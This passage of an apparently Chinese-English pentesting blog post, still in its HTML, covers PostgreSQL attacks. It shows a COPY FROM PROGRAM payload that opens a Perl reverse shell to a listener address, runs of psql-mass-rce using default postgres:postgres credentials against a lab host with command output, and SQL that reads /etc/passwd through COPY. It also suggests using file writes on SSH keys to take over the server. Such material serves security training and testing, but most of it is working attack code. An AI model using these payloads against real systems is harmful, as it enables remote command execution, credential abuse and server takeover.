</span></span></span><span class=line><span class=cl><span class=w>                       </span><span class=n>cmd_output</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w> </span><span class=n>uid</span><span class=o>=</span><span class=mi>111</span><span class=p>(</span><span class=n>postgres</span><span class=p>)</span><span class=w> </span><span class=n>gid</span><span class=o>=</span><span class=mi>121</span><span class=p>(</span><span class=n>postgres</span><span class=p>)</span><span class=w> </span><span class=n>groups</span><span class=o>=</span><span class=mi>121</span><span class=p>(</span><span class=n>postgres</span><span class=p>),</span><span class=mi>109</span><span class=p>(</span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>postgres</span><span class=o>=#</span><span class=w> </span><span class=k>DROP</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=k>IF</span><span class=w> </span><span class=k>EXISTS</span><span class=w> </span><span class=n>cmd_exec</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>DROP</span><span class=w> </span><span class=k>TABLE</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div></li></ul></li><li><p>Payload to run a Perl reverse shell (not tested)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>COPY</span><span class=w> </span><span class=n>cmd_exec</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>FROM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>PROGRAM</span><span class=w> </span><span class=s1>&#39;perl -MIO -e &#39;&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;192.168.0.8:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&#39;&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div></li></ul><h4 id=metasploit-postgresql-copy-from-program-command-execution-module><span class=section-num>7.2.2</span> Metasploit - &lsquo;PostgreSQL COPY FROM PROGRAM Command Execution&rsquo; module</h4><ul><li><a href=https://www.cvedetails.com/cve/CVE-2019-9193/ target=_blank rel="noopener noreffer">https://www.cvedetails.com/cve/CVE-2019-9193/</a></li><li><a href=https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec target=_blank rel="noopener noreffer">https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec</a></li></ul><h4 id=psql-mass-rce-script--https-github-dot-com-attackercan-psql-mass-rce><span class=section-num>7.2.3</span> PSQL-MASS-RCE script (<a href=https://github.com/attackercan/psql-mass-rce target=_blank rel="noopener noreffer">https://github.com/attackercan/psql-mass-rce</a>)</h4><p>psql-mass-rce 是一个渗透测试工具，能够让使用者方便地对网络中的许多 PostgreSQL 服务器进行远程命令执行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts/postgres# python ./psql-mass-rce.py 192.168.1.104 --command &#39;whoami&#39;
</span></span><span class=line><span class=cl>[x] Starting host 192.168.1.104:5432
</span></span><span class=line><span class=cl>(&#39;[+] Good credentials:&#39;, &#39;postgres:postgres&#39;)
</span></span><span class=line><span class=cl>[!] RCE &#39;whoami&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts/postgres# python ./psql-mass-rce.py 192.168.1.104 --command &#39;hostname&#39;
</span></span><span class=line><span class=cl>[x] Starting host 192.168.1.104:5432
</span></span><span class=line><span class=cl>(&#39;[+] Good credentials:&#39;, &#39;postgres:postgres&#39;)
</span></span><span class=line><span class=cl>[!] RCE &#39;hostname&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>typhoon.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts/postgres# python ./psql-mass-rce.py 192.168.1.104 --command &#39;ifconfig&#39;
</span></span><span class=line><span class=cl>[x] Starting host 192.168.1.104:5432
</span></span><span class=line><span class=cl>(&#39;[+] Good credentials:&#39;, &#39;postgres:postgres&#39;)
</span></span><span class=line><span class=cl>[!] RCE &#39;ifconfig&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>docker0   Link encap:Ethernet  HWaddr 02:42:a8:79:d6:eb
</span></span><span class=line><span class=cl>          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
</span></span><span class=line><span class=cl>          UP BROADCAST MULTICAST  MTU:1500  Metric:1
</span></span><span class=line><span class=cl>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
</span></span><span class=line><span class=cl>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span class=line><span class=cl>          collisions:0 txqueuelen:0
</span></span><span class=line><span class=cl>          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>eth0      Link encap:Ethernet  HWaddr 08:00:27:34:bf:f6
</span></span><span class=line><span class=cl>          inet addr:192.168.1.104  Bcast:192.168.1.255  Mask:255.255.255.0
</span></span><span class=line><span class=cl>          inet6 addr: 2a01:e35:2fef:d7e0:f8ff:85f4:bffc:83cd/64 Scope:Global
</span></span><span class=line><span class=cl>          inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fe34:bff6/64 Scope:Global
</span></span><span class=line><span class=cl>          inet6 addr: fe80::a00:27ff:fe34:bff6/64 Scope:Link
</span></span><span class=line><span class=cl>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span></span><span class=line><span class=cl>          RX packets:1970 errors:0 dropped:0 overruns:0 frame:0
</span></span><span class=line><span class=cl>          TX packets:354 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span class=line><span class=cl>          collisions:0 txqueuelen:1000
</span></span><span class=line><span class=cl>          RX bytes:135643 (135.6 KB)  TX bytes:60155 (60.1 KB)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lo        Link encap:Local Loopback
</span></span><span class=line><span class=cl>          inet addr:127.0.0.1  Mask:255.0.0.0
</span></span><span class=line><span class=cl>          inet6 addr: ::1/128 Scope:Host
</span></span><span class=line><span class=cl>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span></span><span class=line><span class=cl>          RX packets:152 errors:0 dropped:0 overruns:0 frame:0
</span></span><span class=line><span class=cl>          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span class=line><span class=cl>          collisions:0 txqueuelen:0
</span></span><span class=line><span class=cl>          RX bytes:79825 (79.8 KB)  TX bytes:79825 (79.8 KB)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>virbr0    Link encap:Ethernet  HWaddr 4e:99:b8:8a:3c:c4
</span></span><span class=line><span class=cl>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
</span></span><span class=line><span class=cl>          UP BROADCAST MULTICAST  MTU:1500  Metric:1
</span></span><span class=line><span class=cl>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
</span></span><span class=line><span class=cl>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span class=line><span class=cl>          collisions:0 txqueuelen:0
</span></span><span class=line><span class=cl>          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</span></span></code></pre></td></tr></table></div></div><h3 id=数据库和操作系统提升权限><span class=section-num>7.3</span> 数据库和操作系统提升权限</h3><p>使用 <code>pg_read_server_files</code> 和 <code>pg_write_server_files</code> 或“超级用户”权限、读取和写入操作系统文件.</p><p>尝试读取和写入、修改有趣的文件，如配置文件、脚本、日志（例如 “/home/&lt;用户>/.bash_history”），以及 SSH 密钥（例如“/home/&lt;用户>/.ssh/authorized_keys”）等，这些文件将允许你接管托管 PostgreSQL 数据库的 Linux 或 Windows
服务器。</p><h4 id=set-up-the-environments><span class=section-num>7.3.1</span> Set up the environments</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>create</span><span class=w> </span><span class=k>role</span><span class=w> </span><span class=n>pentester</span><span class=w> </span><span class=n>nosuperuser</span><span class=w> </span><span class=n>login</span><span class=w> </span><span class=k>nocreatedb</span><span class=w> </span><span class=n>nocreaterole</span><span class=w> </span><span class=n>Password</span><span class=w> </span><span class=s1>&#39;Password1&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>create</span><span class=w> </span><span class=k>role</span><span class=w> </span><span class=n>auditor</span><span class=w> </span><span class=n>nosuperuser</span><span class=w> </span><span class=n>login</span><span class=w> </span><span class=k>nocreatedb</span><span class=w> </span><span class=n>nocreaterole</span><span class=w> </span><span class=n>Password</span><span class=w> </span><span class=s1>&#39;Password1&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>grant</span><span class=w> </span><span class=n>pg_write_server_files</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>pentester</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>grant</span><span class=w> </span><span class=n>pg_read_server_files</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>auditor</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Then use the command &ldquo;\\du&rdquo; to see the users and roles.</p><h4 id=manual-exploit><span class=section-num>7.3.2</span> Manual exploit</h4><ul><li><p>SQL queries to read files from the system</p><ul><li>CREATE TABLE myfile (input TEXT);</li><li>COPY myfile FROM ‘/etc/passwd’;</li><li>SELECT input FROM myfile;</li></ul></li><li><p>SQL queries to write files in /tmp</p><ul><li>CREATE TABLE testfile (output TEXT);</li><li>INSERT INTO testfile(output) VALUES (‘test’);</li><li>COPY testfile(output) TO ‘/tmp/testfile’;</li></ul></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>postgres=# SHOW  data_directory;
</span></span><span class=line><span class=cl>        data_directory
</span></span><span class=line><span class=cl>------------------------------
</span></span><span class=line><span class=cl> /var/lib/postgresql/9.3/main
</span></span><span class=line><span class=cl>(1 row)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres=# select pg_ls_dir(&#39;./&#39;);
</span></span><span class=line><span class=cl>    pg_ls_dir
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl> PG_VERSION
</span></span><span class=line><span class=cl> pg_notify
</span></span><span class=line><span class=cl> pg_multixact
</span></span><span class=line><span class=cl> pg_subtrans
</span></span><span class=line><span class=cl> pg_serial
</span></span><span class=line><span class=cl> pg_snapshots
</span></span><span class=line><span class=cl> pg_stat
</span></span><span class=line><span class=cl> pg_clog
</span></span><span class=line><span class=cl> pg_xlog
</span></span><span class=line><span class=cl> base
</span></span><span class=line><span class=cl> pg_twophase
</span></span><span class=line><span class=cl> pg_tblspc
</span></span><span class=line><span class=cl> global
</span></span><span class=line><span class=cl> pg_stat_tmp
</span></span><span class=line><span class=cl> postmaster.opts
</span></span><span class=line><span class=cl> postmaster.pid
</span></span><span class=line><span class=cl>(16 rows)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres=# select pg_read_file(&#39;PG_VERSION&#39;);
</span></span><span class=line><span class=cl> pg_read_file
</span></span><span class=line><span class=cl>--------------
</span></span><span class=line><span class=cl> 9.3         +
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(1 row)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres=# select pg_read_file(&#39;/etc/passwd&#39;);
</span></span><span class=line><span class=cl>           ERROR: absolute path not allowed
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres=# create table docs (data TEXT);
</span></span><span class=line><span class=cl>           CREATE TABLE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres=# copy docs from &#39;/etc/passwd&#39;;
</span></span><span class=line><span class=cl>           COPY 52
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres=# select * from docs limit 10;
</span></span><span class=line><span class=cl>           data
</span></span><span class=line><span class=cl>           ---------------------------------------------------
</span></span><span class=line><span class=cl>           admin:x:1001:1001:,,,:/home/admin:/bin/bash
</span></span><span class=line><span class=cl>           avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
</span></span><span class=line><span class=cl>           backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>           &lt;SNIP&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>postgres=# drop table docs;
</span></span><span class=line><span class=cl>           DROP TABLE
</span></span></code></pre></td></tr></table></div></div><h4 id=metasploit-postgres-readfile-module><span class=section-num>7.3.3</span> Metasploit - &lsquo;postgres_readfile&rsquo; module</h4></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2025-12-10</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pentest/>Pentest</a>,&nbsp;<a href=/tags/penetration/>Penetration</a>,&nbsp;<a href=/tags/shentou/>Shentou</a>,&nbsp;<a href=/tags/pg/>Pg</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/2025/12/database-penetration-testing/ class=prev rel=prev title="Database Penetration Testing 数据库渗透测"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Database Penetration Testing 数据库渗透测</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:50},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>